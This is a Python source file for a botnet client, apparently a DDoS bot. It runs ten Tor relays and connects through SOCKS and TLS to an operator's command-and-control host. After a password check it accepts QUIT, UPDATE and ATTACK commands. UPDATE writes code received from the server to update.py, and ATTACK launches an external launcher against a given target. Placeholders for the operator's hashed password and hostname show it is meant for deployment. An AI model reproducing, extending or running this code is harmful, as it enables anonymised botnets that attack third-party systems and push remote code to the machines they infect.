import ssl
from time import sleep
import socks
import update
from sys import argv
import hashlib
from multiprocessing import Process
import subprocess
import socket

server_password = "PUT_YOUR_MEZUBU_HASHED_PASSWORD_HERE"
default_host = "PUT_YOUR_HOSTNAME_HERE"
tor_relay_count = 10
socks_ports = [9052, 9054, 9056, 9058, 9060, 9062, 9064, 9066, 9068, 9070]


class Client:
	def __init__(self, host=default_host):
		self.host = host
		self.start()

	def connect(self):
		try:
			socks_socket = socks.socksocket()
			socks_socket.set_proxy(socks.SOCKS5, "127.0.0.1", 9152)
			socks_socket.connect((self.host, 80))
			return socks_socket
		except socks.ProxyConnectionError:
			sleep(10)
			self.start()

	def handler(self, client_socket):
		self.quit_boolean = False
		client_socket.settimeout(120)
		while not self.quit_boolean:
			try:
				package = client_socket.recv(1024)
				if package:
					print(package)
					self.handle_package(package)
				else:
					self.quit_boolean = True
			except socket.timeout:
				self.quit_boolean = True
			except Exception as e:
				print("Exception:", e)
		self.start()

	def handle_package(self, package):
		try:
			if package.decode().find("|PASS|") > -1:
				password = package.decode().split("|PASS|")[1]
				if hashlib.sha256(password.encode("utf-8")).hexdigest() == server_password:
					package = package.decode().split("|PASS|")[-1]
					self.process_package(package)
		except Exception as e:
			print("Exception:", e)

	def process_package(self, package):
		try:
			if len(package.split("|")) > 1:
				package = package.split("|")
				if package[1] == "QUIT":
					self.quit_boolean = True
				elif package[1] == "UPDATE":
					size = int(package[2])
					data = client_socket.recv(size)
					with open("update.py", "wb") as file:
						file.write(data)
				elif package[1] == "ATTACK":
					proc = Process(target=update.Launcher, args=(package[2], int(package[6]),))
					proc.start()
		except Exception as e:
			print("Exception:", e)

	def stop_tor_relays(self):
		for torrc_number in range(1, tor_relay_count + 1):
			subprocess.Popen(f"pkill -f './tor -f tor_client/torrc.{torrc_number}'", shell=True).wait()

	def stop_tor_relay(self, torrc_number):
		subprocess.Popen(f"pkill -f './tor -f tor_client/torrc.{torrc_number}'", shell=True).wait()

	def verify_local_ports(self):
		run = True
		for port in socks_ports:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex(('localhost', port))
			if result == 0:
				run = False
				print(f"[ERROR] Port {port} is in use!")
		if not run:
			exit(0)

	def start_tor_relays(self):
		counter = 1
		while counter <= tor_relay_count:
			temp = self.start_tor_relay(counter)
			if temp:
				counter +=1
			else:
				self.stop_tor_relay(counter)

	def start_tor_relay(self, torrc_number):
		try:
			print(f"\n\n{torrc_number}º TOR RELAY\n\n")
			proc = subprocess.Popen(["./tor", "-f", f"tor_client/torrc.{torrc_number}"], stdout=subprocess.PIPE)
			for line in proc.stdout:
				print(line.decode("utf-8").strip())
				if "[notice] Bootstrapped 100% (done): Done" in line.decode("utf-8"):
					return True
				elif "[err] Reading config failed--see warnings above." in line.decode("utf-8"):
					proc.kill()
		except Exception as e:
			print("Exception:", e)
		return False

	def start(self):
		self.stop_tor_relays()
		self.verify_local_ports()
		self.start_tor_relays()
		while True:
			try:
				with self.connect() as socks_socket:
					context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
					context.load_verify_locations(cafile="cert.pem")
					context.verify_mode = ssl.CERT_REQUIRED
					client_socket = context.wrap_socket(socks_socket, server_hostname=self.host)
					proc = Process(target=self.handler, args=(client_socket,))
					proc.start()
					proc.join()
			except KeyboardInterrupt:
				print("Exiting...")
				exit(0)
			except socks.GeneralProxyError:
				sleep(10)
			except Exception as e:
				print("Exception:", e)
				sleep(10)

if __name__ == "__main__":
	host = default_host
	if len(argv) == 2:
		host = argv[1]
	client = Client(host)
